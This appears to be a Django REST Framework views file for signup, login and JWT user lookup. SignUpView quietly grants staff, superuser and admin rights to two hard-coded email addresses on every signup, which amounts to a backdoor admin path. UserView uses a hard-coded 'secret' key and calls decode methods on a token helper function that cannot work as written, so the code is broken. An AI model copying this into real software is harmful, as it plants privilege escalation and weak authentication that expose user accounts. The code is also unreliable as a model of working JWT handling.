from django.shortcuts import render
from rest_framework import generics, status
from rest_framework.views import APIView
from rest_framework.exceptions import AuthenticationFailed
from django.contrib.auth import authenticate
from rest_framework.response import Response
from .models import User
from .serializers import SignUpSerializer
from .token import get_tokens_for_user
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from rest_framework_simplejwt.views import TokenObtainPairView
from django.views.generic import View

class MyTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        
        token['username'] = user.username
        token['email'] = user.email

        return token

class MyTokenObtainPairView(TokenObtainPairView):
    serializer_class = MyTokenObtainPairSerializer

class SignUpView(generics.GenericAPIView):
    serializer_class = SignUpSerializer
    def post(self, request):
        data = request.data
        serializer = self.serializer_class(data=data)
        serializer.is_valid(raise_exception=True)
        serializer.save()
        User.objects.filter(email='se6359@gmail.com').update(is_staff=True, is_superuser=True, is_admin=True)
        User.objects.filter(email='filfer05@gmail.com').update(is_staff=True, is_superuser=True, is_admin=True)
        user_data = serializer.data

        return Response(user_data, status=status.HTTP_201_CREATED)
        
class LoginView(APIView):
    def post(self, request):
        email = request.data['email']
        password = request.data['password']

        #user = User.objects.filter(email=email).first()
        user = authenticate(email=email, password=password)
        
        if user is None:
            raise AuthenticationFailed('User not found')

        if not user.check_password(password):
            raise AuthenticationFailed('Incorrect password')

        tokens = get_tokens_for_user(user)

        response = {'message': 'Login Successfull', 'tokens': tokens}
        return Response(data=response, status=status.HTTP_200_OK)

class UserView(APIView):

    def get(self, request):
        token = request.COOKIES.get('jwt')

        if not token:
            raise AuthenticationFailed('Unauthenticated!')
        try:
            payload = get_tokens_for_user.decode(token, 'secret', algorithms=['HS256'])
        except get_tokens_for_user.ExpiredSignatureError:
            raise AuthenticationFailed('Unauthenticated!')

        user = User.objects.filter(id=payload['id']).first()
        serializer = SignUpSerializer(user)

        return Response(serializer.data)